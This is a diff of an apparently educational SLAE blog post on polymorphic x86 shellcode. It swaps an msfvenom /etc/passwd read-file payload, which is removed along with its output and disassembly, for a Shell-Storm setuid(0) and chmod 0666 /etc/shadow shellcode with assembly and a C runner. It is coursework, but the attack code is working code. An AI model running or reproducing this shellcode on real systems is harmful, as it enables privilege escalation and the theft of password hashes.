@@ -32,7 +32,7 @@ The 3 Shell-Storm references that will be modified:
 
 * Execve <code class="language-plaintext highlighter-rouge">/bin/sh</code> 
 * <code class="language-plaintext highlighter-rouge">killall</code> processes 
-* Chmod <code class="language-plaintext highlighter-rouge">/etc/shadow</code>  
+* Chmod 666 <code class="language-plaintext highlighter-rouge">/etc/shadow</code>  
 
 #### 1st Shellcode (Execve /bin/sh)
 --------
@@ -214,7 +214,7 @@ The polymorphic version of the shellcode is 32% larger in size compared to the o
 #### 2nd Shellcode (Killall Processes)
 --------------
 
-A <code class="language-plaintext highlighter-rouge">killall</code> command on a Linux based system will literally terminate all running processes that are currently active on the target host’s machine.
+The <code class="language-plaintext highlighter-rouge">killall</code> command on a Linux based system will literally terminate all running processes that are currently active on the target host’s machine.
 
 Referenced from Shell-Storm [http://shell-storm.org/shellcode/files/shellcode-212.php] [killall-shellstorm]:
 
@@ -322,109 +322,56 @@ Connection to 192.168.0.142 closed.
 
 The polymorphic version of the shellcode is 36% larger in size compared to the original reference from Shell-Storm.
 
-#### 3rd Shellcode (chmod 0777 /etc/shadow)
+#### 3rd Shellcode (chmod 666 /etc/shadow)
 --------------
 
-The Read File payload reads a chosen file as specified, requiring 2 arguments, the file descriptor to write the output to (standard output), and the <code class="language-plaintext highlighter-rouge">PATH</code> to the file:
+The <code class="language-plaintext highlighter-rouge">chmod 666 /etc/shadow</code> command sets the permission on the shadow file to allow all users to read/write to the file, but cannot execute the file on the target host’s machine.
 
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/read_file PATH=/etc/passwd --arch x86 --platform linux -f c
-No encoder or badchars specified, outputting raw payload
-Payload size: 73 bytes
-Final size of c file: 331 bytes
-unsigned char buf[] = 
-"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
-"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
-"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
-"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
-"\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00";
-```
+The shadow file is a highly valued file as it stores all the user's passwords within this file, the passwords are stored as a long string of characters combined with the hashing algorithm used as well as an optional salt value, revealing the hashed password of all users on the local system.
 
-A C program scripted with the newly generated shellcode:
+Referenced from Shell-Storm [http://shell-storm.org/shellcode/files/shellcode-608.php] [chmod_etc_shadow-shellstorm]:
 
 ```c
-/**
-* Filename: readfile_shellcode.c
-* Author: h3ll0clar1c3
-* Purpose: Read a specified file on the local host  
-* Compilation: gcc -fno-stack-protector -z execstack -m32 readfile_shellcode.c -o readfile  
-* Usage: ./readfile
-* Shellcode size: 4 bytes
-* Architecture: x86
-**/
+/* 
+ * Title: linux/x86 setuid(0) + chmod("/etc/shadow", 0666) Shellcode 37 Bytes
+ * Type: Shellcode
+ * Author: antrhacks
+ * Platform: Linux X86
+*/
 
-#include <stdio.h>
-#include <string.h>
+/* ASSembly
+ 31 db                	xor    %ebx,%ebx
+ b0 17                	mov    $0x17,%al
+ cd 80                	int    $0x80
+ 31 c0                	xor    %eax,%eax
+ 50                   	push   %eax
+ 68 61 64 6f 77       	push   $0x776f6461
+ 68 63 2f 73 68       	push   $0x68732f63
+ 68 2f 2f 65 74       	push   $0x74652f2f
+ 89 e3                	mov    %esp,%ebx
+ 66 b9 b6 01          	mov    $0x1b6,%cx
+ b0 0f                	mov    $0xf,%al
+ cd 80                	int    $0x80
+ 40                   	inc    %eax
+ cd 80                	int    $0x80
+*/
 
-unsigned char code[] = \
-"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
-"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
-"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
-"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
-"\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00";
+int main(){
+ char shell[] = "\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x50"
+"\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68"
+"\x68\x2f\x2f\x65\x74\x89\xe3\x66\xb9\xb6\x01"
+"\xb0\x0f\xcd\x80\x40\xcd\x80";
 
-int main()
-{
-        printf("Shellcode length:  %d\n", strlen(code));
-        int (*ret)() = (int(*)())code;
-        ret();
+ printf("[*] Taille du ShellCode = %d\n", strlen(shell));
+ (*(void (*)()) shell)();
+ 
+ return 0;
 }
 ```
 
-As a POC, the C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 4 bytes:
+The polymorphic (modified) version of the original shellcode is scripted in Assembly:
 
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -zexecstack readfile_shellcode.c -o readfile
-osboxes@osboxes:~/Downloads/SLAE$ ./readfile 
-Shellcode length:  4
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-bin:x:2:2:bin:/bin:/bin/sh
-www-data:x:33:33:www-data:/var/www:/bin/sh
-osboxes:x:1000:1000:osboxes.org,,,:/home/osboxes:/bin/bash
-```
 
-The Ndisasm tool (similar to GDB) is used to step through the program code and analyze the system calls:
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/read_file PATH=/etc/passwd --arch x86 --platform linux | ndisasm -u -
-No encoder or badchars specified, outputting raw payload
-Payload size: 73 bytes
-
-00000000  EB36		jmp short 0x38		        ; jmp to address 0x38 (jmp, call, pop)
-00000002  B805000000    mov eax,0x5			; open syscall = 0x5
-00000007  5B            pop ebx				; pop address of /etc/passwd into ebx
-00000008  31C9          xor ecx,ecx			; zeroize ecx register, open file as O_RDONLY
-0000000A  CD80          int 0x80			; call the interrupt to execute the open syscall
-0000000C  89C3          mov ebx,eax			; move eax into ebx (0x5)
-0000000E  B803000000    mov eax,0x3			; read syscall = 0x3
-00000013  89E7          mov edi,esp			; move stack pointer into edi
-00000015  89F9          mov ecx,edi			; move stack pointer into ecx
-00000017  BA00100000    mov edx,0x1000		        ; move 0x1000 (4096) into edx 
-0000001C  CD80          int 0x80			; call the interrupt to execute the read syscall
-0000001E  89C2          mov edx,eax			; size of read data
-00000020  B804000000    mov eax,0x4			; write syscall = 0x4 
-00000025  BB01000000    mov ebx,0x1			; move 0x1 (stdout) into ebx stdout
-0000002A  CD80          int 0x80			; call the interrupt to execute the write syscall 
-0000002C  B801000000    mov eax,0x1			; exit syscall = 0x1
-00000031  BB00000000    mov ebx,0x0			; move 0 (exit/return code) into ebx
-00000036  CD80          int 0x80			; call the interrupt to execute the exit syscall
-00000038  E8C5FFFFFF    call 0x2			; jmp up, put next instruction onto the stack
-0000003D  2F            das				; read the file contents (/etc/passwd)
-0000003E  657463        gs jz 0xa4
-00000041  2F            das
-00000042  7061          jo 0xa5
-00000044  7373          jnc 0xb9
-00000046  7764          ja 0xac
-00000048  00            db 0x00
-```
-
-The disassembled code consists of the following components:
-
-* open syscall -> <code class="language-plaintext highlighter-rouge">0x5</code>
-* read syscall -> <code class="language-plaintext highlighter-rouge">0x3</code>
-* write syscall -> <code class="language-plaintext highlighter-rouge">0x4</code>
-* exit syscall -> <code class="language-plaintext highlighter-rouge">0x1</code>
 
 ##### SLAE Disclaimer ####
 ---------
@@ -439,3 +386,4 @@ GitHub Repo: [Code][github-code]
 [github-code]: https://github.com/h3ll0clar1c3/SLAE/tree/master/Exam/Assignment6
 [execve-shellstorm]: http://shell-storm.org/shellcode/files/shellcode-811.php
 [killall-shellstorm]: http://shell-storm.org/shellcode/files/shellcode-212.php
+[chmod_etc_shadow-shellstorm]: http://shell-storm.org/shellcode/files/shellcode-608.php
